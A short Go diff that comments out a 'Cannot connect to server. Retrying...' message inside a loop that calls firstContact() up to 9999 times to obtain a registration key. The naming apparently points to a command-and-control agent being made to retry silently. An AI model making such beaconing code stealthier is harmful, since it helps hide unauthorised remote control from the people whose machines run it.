@@ -294,7 +294,7 @@ func main() {
 	registerkey = firstContact()
 	if strings.Contains(registerkey, "[-]") {
 		for i := 1; i < 9999; i++ {
-			fmt.Println("[-] Cannot connect to server. Retrying...")
+			//fmt.Println("[-] Cannot connect to server. Retrying...")
 			registerkey = firstContact()
 			if !strings.Contains(registerkey, "[-]") {
 				break
